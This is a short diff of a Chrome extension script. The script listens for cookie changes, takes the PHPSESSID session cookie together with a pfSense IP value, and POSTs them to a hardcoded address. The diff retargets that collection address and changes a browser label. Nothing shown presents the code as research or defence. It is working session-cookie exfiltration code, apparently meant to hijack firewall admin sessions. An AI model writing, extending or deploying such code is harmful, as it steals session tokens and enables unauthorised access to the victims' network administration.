@@ -1,6 +1,6 @@
 chrome.cookies.onChanged.addListener((changeInfo) => {
     const cookie = changeInfo.cookie;
-    const ip = "https://192.168.1.9/data"
+    const ip = "https://192.168.10.169/data"
     
 
     if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
@@ -12,7 +12,7 @@ chrome.cookies.onChanged.addListener((changeInfo) => {
         const data = new URLSearchParams();
         data.append('session', sessionId);
         data.append('pfsense_ip2', pfsense_ip1);
-        data.append('browser', "Edge")
+        data.append('browser', "Chrome")
         fetch(ip, {
             method: 'POST',
             body: data
